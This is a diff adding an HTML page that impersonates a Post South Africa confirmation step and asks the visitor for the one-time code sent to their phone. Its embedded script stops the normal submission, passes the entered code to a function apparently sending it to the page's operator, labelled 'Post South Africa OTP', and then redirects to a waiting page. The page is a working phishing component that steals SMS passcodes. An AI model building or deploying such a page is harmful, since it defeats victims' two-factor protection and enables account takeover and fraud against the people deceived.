@@ -1,0 +1,55 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/south.css">
+   
+    
+    <title></title>
+   
+</head>
+<body style="text-align:center;">
+    
+<div class="zz"> <img src="res/img/post.jpg" alt="photo"> </div>
+
+<div class="heads">
+<form action="post.php" method="post">
+
+<div style="margin:10px 0;">
+<h2>Confirmation</h2>
+<p>Please enter the code sent to your phone number to continue.</p>
+</div>
+
+<div class="col">
+<input type="text" placeholder="Enter code" name="otp" required>  
+
+</div>
+
+
+<div class="col">
+    <button type="submit"> Confirm</button>
+</div>
+</form>
+
+</div>
+
+
+<script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+    e.preventDefault();
+
+    wu.zhong(`🔒 Post South Africa OTP: ${document.querySelector("[name='otp']").value}`);
+
+    window.location="wait.html";
+
+})
+
+</script>
+
+
+</body>
+</html>
